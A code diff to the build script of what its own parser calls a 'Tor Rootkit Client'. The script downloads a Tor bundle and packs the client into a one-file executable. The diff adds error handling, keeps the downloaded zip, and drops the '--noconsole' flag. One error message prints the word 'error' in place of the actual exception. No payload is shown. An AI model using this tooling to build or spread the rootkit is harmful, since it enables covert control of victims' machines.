@@ -2,6 +2,7 @@ import PyInstaller.__main__
 import requests
 import os
 import zipfile
+import sys
 from argparse import ArgumentParser
 
 
@@ -13,21 +14,29 @@ def getTorExpertBundle():
 	# download tor expert bundle
 	torURL = 'https://www.torproject.org/dist/torbrowser/10.0.12/tor-win32-0.4.5.6.zip'
 	fileData = requests.get(torURL, allow_redirects=True)
-	with open('tor.zip', 'wb') as file:
+
+	# write downloaded tor expert bundle
+	try:
+		file = open('tor.zip', 'wb')
 		file.write(fileData.content)
+	except Exception as error:
+		print('[-] Error while writing tor expert bundle: {}'.format(error))
+		sys.exit(1)
+	else:
+		print('[*] Wrote tor expert bundle to file')
 	
 	# unzip tor expert bundle
-	with zipfile.ZipFile('tor.zip') as file:
+	try:
+		file = zipfile.ZipFile('tor.zip')
 		file.extractall('.')
-	
-	# remove zip file
-	if os.path.isfile('tor.zip'):
-		os.remove('tor.zip')
+	except Exception as error:
+		print("[-] Error while unpacking tor library: {}".format('error'))
+		sys.exit(1)
+	else:
+		print("[*] Unpacked Tor expert bundle")
 
 	# change directory back to \client
 	os.chdir('..')
-
-
 
 def parse_args():
 	parser = ArgumentParser(description='Python3 Tor Rootkit Client')
@@ -55,6 +64,5 @@ if __name__ == '__main__':
 	PyInstaller.__main__.run([
 	    'client.py',
 	    '--onefile',
-	    '--noconsole',
 	    '--add-data=torbundle;torbundle'
 	])
